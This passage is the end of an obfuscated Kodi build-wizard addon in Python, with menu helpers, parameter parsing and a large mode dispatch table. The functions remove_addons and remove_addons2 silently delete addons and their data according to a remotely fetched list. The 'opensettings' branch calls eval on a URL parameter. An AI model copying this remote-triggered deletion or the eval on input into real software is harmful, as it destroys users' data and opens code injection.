	OO000000O00O0OOO0 =xbmcgui .ListItem (O00OO0O0OOO00O000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5070
	OO000000O00O0OOO0 .setInfo (type ="Video",infoLabels ={"Title":O00OO0O0OOO00O000 ,"Plot":description })#line:5071
	OO000000O00O0OOO0 .setProperty ("Fanart_Image",fanart )#line:5072
	if not menu ==None :OO000000O00O0OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5073
	O000O00OOOOOOO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0OO00OOO0OO00 ,listitem =OO000000O00O0OOO0 ,isFolder =True )#line:5074
	return O000O00OOOOOOO0OO #line:5075
def addFile (OOOO0O0O00OOO0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5077
	OO0000OOO0O0OO0OO =sys .argv [0 ]#line:5078
	if not mode ==None :OO0000OOO0O0OO0OO +="?mode=%s"%urllib .quote_plus (mode )#line:5079
	if not name ==None :OO0000OOO0O0OO0OO +="&name="+urllib .quote_plus (name )#line:5080
	if not url ==None :OO0000OOO0O0OO0OO +="&url="+urllib .quote_plus (url )#line:5081
	O0000OOO0O0OOO0OO =True #line:5082
	if themeit :OOOO0O0O00OOO0OOO =themeit %OOOO0O0O00OOO0OOO #line:5083
	OOOOOOO0O0O0O0O00 =xbmcgui .ListItem (OOOO0O0O00OOO0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5084
	OOOOOOO0O0O0O0O00 .setInfo (type ="Video",infoLabels ={"Title":OOOO0O0O00OOO0OOO ,"Plot":description })#line:5085
	OOOOOOO0O0O0O0O00 .setProperty ("Fanart_Image",fanart )#line:5086
	if not menu ==None :OOOOOOO0O0O0O0O00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5087
	O0000OOO0O0OOO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0000OOO0O0OO0OO ,listitem =OOOOOOO0O0O0O0O00 ,isFolder =False )#line:5088
	return O0000OOO0O0OOO0OO #line:5089
def get_params ():#line:5091
	OO0O00OOO00OO0O00 =[]#line:5092
	O0OO00O0000OOO000 =sys .argv [2 ]#line:5093
	if len (O0OO00O0000OOO000 )>=2 :#line:5094
		OOOOO00O000O0000O =sys .argv [2 ]#line:5095
		OOOO0OO00OOO0O00O =OOOOO00O000O0000O .replace ('?','')#line:5096
		if (OOOOO00O000O0000O [len (OOOOO00O000O0000O )-1 ]=='/'):#line:5097
			OOOOO00O000O0000O =OOOOO00O000O0000O [0 :len (OOOOO00O000O0000O )-2 ]#line:5098
		OO0OO0OO0O00O00OO =OOOO0OO00OOO0O00O .split ('&')#line:5099
		OO0O00OOO00OO0O00 ={}#line:5100
		for O0OO0O000OO000000 in range (len (OO0OO0OO0O00O00OO )):#line:5101
			OO0O0O00O0OOO000O ={}#line:5102
			OO0O0O00O0OOO000O =OO0OO0OO0O00O00OO [O0OO0O000OO000000 ].split ('=')#line:5103
			if (len (OO0O0O00O0OOO000O ))==2 :#line:5104
				OO0O00OOO00OO0O00 [OO0O0O00O0OOO000O [0 ]]=OO0O0O00O0OOO000O [1 ]#line:5105
		return OO0O00OOO00OO0O00 #line:5107
def remove_addons ():#line:5109
	try :#line:5110
			import json #line:5111
			O000O0O0O00O0000O =urllib2 .urlopen (remove_url ).readlines ()#line:5112
			for OOOO0OOOOO0OOO0O0 in O000O0O0O00O0000O :#line:5113
				OOOO0OOO0OO0O00O0 =OOOO0OOOOO0OOO0O0 .split (':')[1 ].strip ()#line:5115
				OOO0O0OOOOO0O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOO0OOO0OO0O00O0 ,'false')#line:5116
				O0O0O0O0OOO0OO0O0 =xbmc .executeJSONRPC (OOO0O0OOOOO0O0O0O )#line:5117
				OO0OO0OO0O00O0000 =json .loads (O0O0O0O0OOO0OO0O0 )#line:5118
				OO0OOO000O0OO0OO0 =os .path .join (addons_folder ,OOOO0OOO0OO0O00O0 )#line:5120
				if os .path .exists (OO0OOO000O0OO0OO0 ):#line:5122
					for OO0000000000000OO ,O0O0O0O000O000OO0 ,O00000OOOOO00OO0O in os .walk (OO0OOO000O0OO0OO0 ):#line:5123
						for OOOO00OO0000O0O00 in O00000OOOOO00OO0O :#line:5124
							os .unlink (os .path .join (OO0000000000000OO ,OOOO00OO0000O0O00 ))#line:5125
						for O00O00OO0O0OO0000 in O0O0O0O000O000OO0 :#line:5126
							shutil .rmtree (os .path .join (OO0000000000000OO ,O00O00OO0O0OO0000 ))#line:5127
					os .rmdir (OO0OOO000O0OO0OO0 )#line:5128
			xbmc .executebuiltin ('Container.Refresh')#line:5130
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5131
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5132
	except :pass #line:5133
def remove_addons2 ():#line:5134
	try :#line:5135
			import json #line:5136
			O0O00O0000000000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5137
			for O0O0O00OOOO00O0O0 in O0O00O0000000000O :#line:5138
				O0000OO0O0O00O000 =O0O0O00OOOO00O0O0 .split (':')[1 ].strip ()#line:5140
				O0O0000O0OOO0000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0000OO0O0O00O000 ,'false')#line:5141
				O0OOOOOOO00O0OOOO =xbmc .executeJSONRPC (O0O0000O0OOO0000O )#line:5142
				OOO00O000O00O0OO0 =json .loads (O0OOOOOOO00O0OOOO )#line:5143
				O000OO0O0O000O00O =os .path .join (user_folder ,O0000OO0O0O00O000 )#line:5145
				if os .path .exists (O000OO0O0O000O00O ):#line:5147
					for O0OOO0O000OOO0000 ,O0O0000O000OO000O ,O00OOO0OO0000O000 in os .walk (O000OO0O0O000O00O ):#line:5148
						for OOOO0000O0O00O0OO in O00OOO0OO0000O000 :#line:5149
							os .unlink (os .path .join (O0OOO0O000OOO0000 ,OOOO0000O0O00O0OO ))#line:5150
						for O00OOOOOOO0OO0OOO in O0O0000O000OO000O :#line:5151
							shutil .rmtree (os .path .join (O0OOO0O000OOO0000 ,O00OOOOOOO0OO0OOO ))#line:5152
					os .rmdir (O000OO0O0O000O00O )#line:5153
	except :pass #line:5155
params =get_params ()#line:5156
url =None #line:5157
name =None #line:5158
mode =None #line:5159
try :mode =urllib .unquote_plus (params ["mode"])#line:5161
except :pass #line:5162
try :name =urllib .unquote_plus (params ["name"])#line:5163
except :pass #line:5164
try :url =urllib .unquote_plus (params ["url"])#line:5165
except :pass #line:5166
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5168
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5169
def setView (OOOO00OOO0000000O ,OOO0OOO000000O0OO ):#line:5170
	if wiz .getS ('auto-view')=='true':#line:5171
		OO000OOO0OOOO00OO =wiz .getS (OOO0OOO000000O0OO )#line:5172
		if OO000OOO0OOOO00OO =='50'and KODIV >=17 and SKIN =='skin.estuary':OO000OOO0OOOO00OO ='55'#line:5173
		if OO000OOO0OOOO00OO =='500'and KODIV >=17 and SKIN =='skin.estuary':OO000OOO0OOOO00OO ='50'#line:5174
		wiz .ebi ("Container.SetViewMode(%s)"%OO000OOO0OOOO00OO )#line:5175
if mode ==None :index ()#line:5177
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5179
elif mode =='builds':buildMenu ()#line:5180
elif mode =='viewbuild':viewBuild (name )#line:5181
elif mode =='buildinfo':buildInfo (name )#line:5182
elif mode =='buildpreview':buildVideo (name )#line:5183
elif mode =='install':buildWizard (name ,url )#line:5184
elif mode =='theme':buildWizard (name ,mode ,url )#line:5185
elif mode =='viewthirdparty':viewThirdList (name )#line:5186
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5187
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5188
elif mode =='maint':maintMenu (name )#line:5190
elif mode =='passpin':passandpin ()#line:5191
elif mode =='backmyupbuild':backmyupbuild ()#line:5192
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5193
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5194
elif mode =='advancedsetting':advancedWindow (name )#line:5195
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5196
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5197
elif mode =='asciicheck':wiz .asciiCheck ()#line:5198
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5199
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5200
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5201
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5202
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5203
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5204
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5205
elif mode =='currentsettings':viewAdvanced ()#line:5206
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5207
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5208
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5209
elif mode =='fixskin':backtokodi ()#line:5210
elif mode =='testcommand':testcommand ()#line:5211
elif mode =='logsend':logsend ()#line:5212
elif mode =='rdon':rdon ()#line:5213
elif mode =='rdoff':rdoff ()#line:5214
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5215
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5216
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5217
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5218
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5219
elif mode =='freshstart':freshStart ()#line:5220
elif mode =='forceupdate':wiz .forceUpdate ()#line:5221
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5222
elif mode =='forceclose':wiz .killxbmc ()#line:5223
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5224
elif mode =='hidepassword':wiz .hidePassword ()#line:5225
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5226
elif mode =='enableaddons':enableAddons ()#line:5227
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5228
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5229
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5230
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5231
elif mode =='uploadlog':uploadLog .Main ()#line:5232
elif mode =='viewlog':LogViewer ()#line:5233
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5234
elif mode =='viewerrorlog':errorChecking (all =True )#line:5235
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5236
elif mode =='purgedb':purgeDb ()#line:5237
elif mode =='fixaddonupdate':fixUpdate ()#line:5238
elif mode =='removeaddons':removeAddonMenu ()#line:5239
elif mode =='removeaddon':removeAddon (name )#line:5240
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5241
elif mode =='removedata':removeAddonData (name )#line:5242
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5243
elif mode =='systeminfo':systemInfo ()#line:5244
elif mode =='restorezip':restoreit ('build')#line:5245
elif mode =='restoregui':restoreit ('gui')#line:5246
elif mode =='restoreaddon':restoreit ('addondata')#line:5247
elif mode =='restoreextzip':restoreextit ('build')#line:5248
elif mode =='restoreextgui':restoreextit ('gui')#line:5249
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5250
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5251
elif mode =='apk':apkMenu (name )#line:5253
elif mode =='apkscrape':apkScraper (name )#line:5254
elif mode =='apkinstall':apkInstaller (name ,url )#line:5255
elif mode =='speed':speedMenu ()#line:5256
elif mode =='net':net_tools ()#line:5257
elif mode =='GetList':GetList (url )#line:5258
elif mode =='youtube':youtubeMenu (name )#line:5259
elif mode =='viewVideo':playVideo (url )#line:5260
elif mode =='addons':addonMenu (name )#line:5262
elif mode =='addoninstall':addonInstaller (name ,url )#line:5263
elif mode =='savedata':saveMenu ()#line:5265
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5266
elif mode =='managedata':manageSaveData (name )#line:5267
elif mode =='whitelist':wiz .whiteList (name )#line:5268
elif mode =='trakt':traktMenu ()#line:5270
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5271
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5272
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5273
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5274
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5275
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5276
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5277
elif mode =='realdebrid':realMenu ()#line:5279
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5280
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5281
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5282
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5283
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5284
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5285
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5286
elif mode =='login':loginMenu ()#line:5288
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5289
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5290
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5291
elif mode =='clearlogin':loginit .clearSaved (name )#line:5292
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5293
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5294
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5295
elif mode =='contact':notify .contact (CONTACT )#line:5297
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5298
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5299
elif mode =='developer':developer ()#line:5301
elif mode =='converttext':wiz .convertText ()#line:5302
elif mode =='createqr':wiz .createQR ()#line:5303
elif mode =='testnotify':testnotify ()#line:5304
elif mode =='testnotify2':testnotify2 ()#line:5305
elif mode =='servicemanual':servicemanual ()#line:5306
elif mode =='fastinstall':fastinstall ()#line:5307
elif mode =='testupdate':testupdate ()#line:5308
elif mode =='testfirst':testfirst ()#line:5309
elif mode =='testfirstrun':testfirstRun ()#line:5310
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5311
elif mode =='bg':wiz .bg_install (name ,url )#line:5313
elif mode =='bgcustom':wiz .bg_custom ()#line:5314
elif mode =='bgremove':wiz .bg_remove ()#line:5315
elif mode =='bgdefault':wiz .bg_default ()#line:5316
elif mode =='rdset':rdsetup ()#line:5317
elif mode =='mor':morsetup ()#line:5318
elif mode =='mor2':morsetup2 ()#line:5319
elif mode =='resolveurl':resolveurlsetup ()#line:5320
elif mode =='urlresolver':urlresolversetup ()#line:5321
elif mode =='forcefastupdate':forcefastupdate ()#line:5322
elif mode =='traktset':traktsetup ()#line:5323
elif mode =='placentaset':placentasetup ()#line:5324
elif mode =='flixnetset':flixnetsetup ()#line:5325
elif mode =='reptiliaset':reptiliasetup ()#line:5326
elif mode =='yodasset':yodasetup ()#line:5327
elif mode =='numbersset':numberssetup ()#line:5328
elif mode =='uranusset':uranussetup ()#line:5329
elif mode =='genesisset':genesissetup ()#line:5330
elif mode =='fastupdate':fastupdate ()#line:5331
elif mode =='folderback':folderback ()#line:5332
elif mode =='menudata':Menu ()#line:5333
elif mode ==2 :#line:5335
        wiz .torent_menu ()#line:5336
elif mode ==3 :#line:5337
        wiz .popcorn_menu ()#line:5338
elif mode ==8 :#line:5339
        wiz .metaliq_fix ()#line:5340
elif mode ==9 :#line:5341
        wiz .quasar_menu ()#line:5342
elif mode ==5 :#line:5343
        swapSkins ('skin.Premium.mod')#line:5344
elif mode ==13 :#line:5345
        wiz .elementum_menu ()#line:5346
elif mode ==16 :#line:5347
        wiz .fix_wizard ()#line:5348
elif mode ==17 :#line:5349
        wiz .last_play ()#line:5350
elif mode ==18 :#line:5351
        wiz .normal_metalliq ()#line:5352
elif mode ==19 :#line:5353
        wiz .fast_metalliq ()#line:5354
elif mode ==20 :#line:5355
        wiz .fix_buffer2 ()#line:5356
elif mode ==21 :#line:5357
        wiz .fix_buffer3 ()#line:5358
elif mode ==11 :#line:5359
        wiz .fix_buffer ()#line:5360
elif mode ==15 :#line:5361
        wiz .fix_font ()#line:5362
elif mode ==14 :#line:5363
        wiz .clean_pass ()#line:5364
elif mode ==22 :#line:5365
        wiz .movie_update ()#line:5366
elif mode =='adv_settings':buffer1 ()#line:5367
elif mode =='getpass':getpass ()#line:5368
elif mode =='setpass':setpass ()#line:5369
elif mode =='setuname':setuname ()#line:5370
elif mode =='passandUsername':passandUsername ()#line:5371
elif mode =='9':disply_hwr ()#line:5372
elif mode =='99':disply_hwr2 ()#line:5373
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))